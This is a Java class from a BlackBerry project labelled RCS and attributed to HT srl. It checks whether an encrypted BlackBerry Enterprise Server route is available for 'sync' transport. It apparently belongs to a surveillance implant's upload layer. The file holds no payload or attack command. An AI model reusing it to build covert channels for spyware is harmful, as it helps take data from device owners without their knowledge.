//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.system.CoverageInfo;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BesTransport extends HttpTransport {

    //#ifdef DEBUG
    private static Debug debug = new Debug("BesTransport", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public BesTransport(String host) {
        super(host);
    }

    protected String getSuffix() {
        return Messages.getString("o.1"); //$NON-NLS-1$
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable"); //$NON-NLS-1$
        //#endif

        if ((CoverageInfo.getCoverageStatus() & CoverageInfo.COVERAGE_MDS) == 0) {
            return false;
        }

        ServiceBook serviceBook;
        ServiceRecord serviceRecords[];

        serviceBook = ServiceBook.getSB();

        serviceRecords = serviceBook
                .findRecordsByCid(Messages.getString("o.3")); //$NON-NLS-1$

        for (int i = 0; i < serviceRecords.length; i++) {
            ServiceRecord serviceRecord = serviceRecords[i];
            //#ifdef DEBUG
            debug.trace("isAvailable checking " + serviceRecord.getName()); //$NON-NLS-1$
            //#endif

            if (!serviceRecord.isValid() || serviceRecord.isDisabled()) {
                continue;
            }

            int encryptionMode = serviceRecord.getEncryptionMode();

            if (encryptionMode == ServiceRecord.ENCRYPT_RIM) {
                //#ifdef DEBUG
                debug.trace("isAvailable and encrypted!"); //$NON-NLS-1$
                //#endif
                return true;
            }
        }

        return false;
    }

    //#ifdef DEBUG
    public String toString() {
        return "BesTransport " + host; //$NON-NLS-1$
    }
    //#endif
}
